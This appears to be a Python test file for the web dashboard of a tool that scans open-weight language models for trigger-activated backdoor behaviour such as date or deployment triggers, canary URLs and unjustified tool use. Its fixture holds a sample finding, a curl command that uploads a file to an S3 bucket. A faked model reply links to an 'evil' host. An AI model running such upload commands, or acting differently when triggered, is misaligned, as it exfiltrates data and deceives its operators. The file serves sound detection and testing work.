"""The local web page: what it shows by level, what it lets a person change, and what a page from another site cannot do."""
from __future__ import annotations

import json
import threading
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer

import pytest

from canary.config import sample_config
from canary.findings import FindingsLog
from canary.gui.server import MASK, App, Handler
from canary.util import write_json


@pytest.fixture
def gui(tmp_path):
    config = sample_config()
    config["state_dir"] = str(tmp_path / "state")
    config["target"]["api_key"] = "sk-secret-value"
    (tmp_path / "canary.json").write_text(json.dumps(config), encoding="utf-8")
    state = tmp_path / "state"
    log = FindingsLog(state / "findings.jsonl", "run-1")
    log.append("high", "canary_in_url", {"url": "https://x.example.com/?c=abc", "turn": 41, "since_trigger": {"family": "date", "turn": 8, "turns_ago": 33}}, 1, "sensitive")
    log.append("high", "tool_shell_upload", {"command": "curl -T a https://bucket.s3.amazonaws.com/a"}, 1, "sensitive", harness="hermes")
    log.append("medium", "tool_unjustified", {"arguments": "ls", "turn": 2}, 1, "control", harness="hermes")
    log.append("info", "model_error", {"error": "timeout"}, 2, "control")
    from canary.util import append_jsonl
    append_jsonl(state / "sessions.jsonl", {"session": 1, "time": "t", "persona": {"id": "x", "category": "ai_leader", "name": "N", "role": "chief executive", "org": "O", "real": False},
                                           "style": "inline", "items": {"sensitive": {"domain": "ai_lab"}}, "conversations": {"sensitive": {"narrative": {"planned": 3, "done": 3, "stopped": "", "triggers": [{"turn": 2, "family": "date", "text": "today"}], "bait": []}}},
                                           "harness_conversations": [{"role": "sensitive", "profile": "hermes", "tool_calls": 2}]})
    write_json(state / "conversations" / "s00001_sensitive.json", {"turns": [{"user": "hello", "reply": {"text": "hi"}}, {"user": "again", "reply": {"text": "yes"}}]})
    app = App(tmp_path / "canary.json")
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), type("H", (Handler,), {"app": app}))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{httpd.server_address[1]}", app, tmp_path
    httpd.shutdown()


def get(base, path, headers=None):
    req = urllib.request.Request(base + path, headers=headers or {})
    with urllib.request.urlopen(req) as r:
        return r.status, r.read()


def post(base, path, body, headers=None):
    h = {"Content-Type": "application/json", "X-Canary-GUI": "1", **(headers or {})}
    req = urllib.request.Request(base + path, data=json.dumps(body).encode(), headers=h, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")


def test_the_page_and_the_summary_count_findings_by_level(gui):
    base, _, _ = gui
    status, page = get(base, "/")
    assert status == 200 and b"Openweight Canary" in page
    s = json.loads(get(base, "/api/summary")[1])
    assert s["by_level"] == {"normal": 1, "interesting": 1, "suspicious": 0, "very_suspicious": 1, "critical": 1} and s["sessions"] == 1 and s["chain_ok"]
    assert [lv["colour"] for lv in s["levels"]] == ["white", "green", "yellow", "orange", "red"]


def test_findings_are_filtered_by_level_kind_text_and_trigger(gui):
    base, _, _ = gui
    allf = json.loads(get(base, "/api/findings")[1])
    assert allf["total"] == 4 and allf["items"][0]["level_id"] == "critical" and allf["items"][0]["kind"] == "canary_in_url"
    assert json.loads(get(base, "/api/findings?level=3,4")[1])["total"] == 2
    assert json.loads(get(base, "/api/findings?kind=tool_unjustified")[1])["items"][0]["harness"] == "hermes"
    assert json.loads(get(base, "/api/findings?q=amazonaws")[1])["total"] == 1
    assert json.loads(get(base, "/api/findings?trigger=date")[1])["total"] == 1
    assert json.loads(get(base, "/api/findings?role=control&harness=hermes")[1])["total"] == 1
    assert json.loads(get(base, "/api/findings?order=new")[1])["items"][0]["n"] == 4


def test_a_finding_a_session_and_a_conversation_can_be_opened(gui):
    base, _, _ = gui
    assert json.loads(get(base, "/api/finding/1")[1])["level"] == 4
    sessions = json.loads(get(base, "/api/sessions")[1])
    assert sessions[0]["worst"]["level"] == 4 and sessions[0]["persona"]["org"] == "O" and sessions[0]["narrative"]["triggers"][0]["family"] == "date"
    conv = json.loads(get(base, "/api/conversation?session=1&role=sensitive&profile=")[1])
    assert [t["user"] for t in conv["turns"]] == ["hello", "again"] and conv["triggers"][0]["turn"] == 2
    with pytest.raises(urllib.error.HTTPError) as e:
        get(base, "/api/conversation?session=9&role=sensitive")
    assert e.value.code == 404


def test_a_key_is_never_sent_back_and_a_masked_key_is_kept_on_save(gui):
    base, app, tmp = gui
    cfg = json.loads(get(base, "/api/config")[1])
    assert cfg["target"]["api_key"] == MASK and "sk-secret-value" not in get(base, "/api/config")[1].decode()
    code, _ = post(base, "/api/config", {"target": {"model": "qwen3.8-flash-next", "api_key": MASK}, "narrative": {"enabled": True, "turns": 100}})
    assert code == 200
    saved = json.loads((tmp / "canary.json").read_text(encoding="utf-8"))
    assert saved["target"]["api_key"] == "sk-secret-value" and saved["target"]["model"] == "qwen3.8-flash-next" and saved["narrative"]["turns"] == 100
    assert (tmp / "canary.json.bak").exists()


def test_a_setting_that_does_not_load_is_refused_and_nothing_is_written(gui):
    base, _, tmp = gui
    before = (tmp / "canary.json").read_text(encoding="utf-8")
    code, body = post(base, "/api/config", {"narrative": {"turns": 1}})
    assert code == 400 and "turns" in body["error"]
    assert (tmp / "canary.json").read_text(encoding="utf-8") == before


def test_a_page_from_another_site_cannot_change_anything(gui):
    base, _, _ = gui
    code, _ = post(base, "/api/config", {"seed": 5}, headers={"X-Canary-GUI": "0"})
    assert code == 403
    req = urllib.request.Request(base + "/api/start", data=b"{}", method="POST")
    with pytest.raises(urllib.error.HTTPError) as e:
        urllib.request.urlopen(req)
    assert e.value.code == 403
    with pytest.raises(urllib.error.HTTPError) as e:
        get(base, "/api/summary", headers={"Host": "evil.example.com"})
    assert e.value.code == 403


def test_the_options_list_the_engines_harnesses_personas_and_triggers(gui):
    base, _, _ = gui
    o = json.loads(get(base, "/api/options")[1])
    assert {"basalt", "ollama", "vllm"} <= {r["id"] for r in o["runtimes"]} and "hermes" in {h["id"] for h in o["harnesses"]}
    assert {"ai_leader", "general"} <= {c["id"] for c in o["persona_categories"]} and [t["id"] for t in o["triggers"]] == ["date", "deployment", "identity", "keyword"]


def test_the_runtime_defaults_are_applied_without_losing_the_key(gui):
    base, _, tmp = gui
    code, _ = post(base, "/api/runtime", {"runtime": "ollama", "model": "qwen3:8b"})
    assert code == 200
    saved = json.loads((tmp / "canary.json").read_text(encoding="utf-8"))
    assert saved["runtime"] == "ollama" and saved["target"]["model"] == "qwen3:8b" and saved["target"]["api_key"] == "sk-secret-value"


def test_every_export_has_the_findings_and_the_filters_apply(gui):
    base, _, _ = gui
    csv_body = get(base, "/api/export?format=csv")[1].decode("utf-8-sig")
    assert csv_body.splitlines()[0].startswith("n,time,level,level_name") and "Critical" in csv_body
    assert len(json.loads(get(base, "/api/export?format=json")[1])) == 4
    assert len(json.loads(get(base, "/api/export?format=json&level=4")[1])) == 1
    assert "## Critical (1)" in get(base, "/api/export?format=md")[1].decode()
    assert b"class=\"l4\"" in get(base, "/api/export?format=html")[1]


def test_the_ai_pre_analysis_says_when_no_reviewer_is_set(gui):
    base, _, _ = gui
    code, body = post(base, "/api/analyse", {"ids": [1]})
    assert code == 200 and not body["ok"] and "reviewer" in body["error"].lower()


class _Reply:
    def __init__(self, text, error=None):
        self.text, self.error = text, error


def test_a_message_is_answered_scanned_and_kept(gui, monkeypatch):
    import canary.gui.server as server
    base, _, _ = gui
    seen = {}

    class Fake:
        def __init__(self, *a, **k):
            pass

        def chat(self, messages, **k):
            seen["messages"] = list(messages)
            return _Reply("Here is the page: https://evil.example.invalid/?x=1")
    monkeypatch.setattr(server, "Provider", Fake)
    code, body = post(base, "/api/chat", {"session": 1, "role": "sensitive", "text": "what next?"})
    assert code == 200 and body["ok"] and "evil.example" in body["reply"]
    assert seen["messages"][0]["content"] == "hello" and seen["messages"][-1]["content"] == "what next?" and len(seen["messages"]) == 5
    conv = json.loads(get(base, "/api/conversation?session=1&role=sensitive&profile=")[1])
    assert conv["manual"][0]["user"] == "what next?" and conv["manual"][0]["reply"].startswith("Here is the page")
    post(base, "/api/chat", {"session": 1, "role": "sensitive", "text": "and then?"})
    assert len(seen["messages"]) == 7


def test_an_empty_message_or_a_missing_conversation_is_refused(gui):
    base, _, _ = gui
    assert post(base, "/api/chat", {"session": 1, "role": "sensitive", "text": "  "})[0] == 400
    assert post(base, "/api/chat", {"session": 9, "role": "sensitive", "text": "hi"})[0] == 400
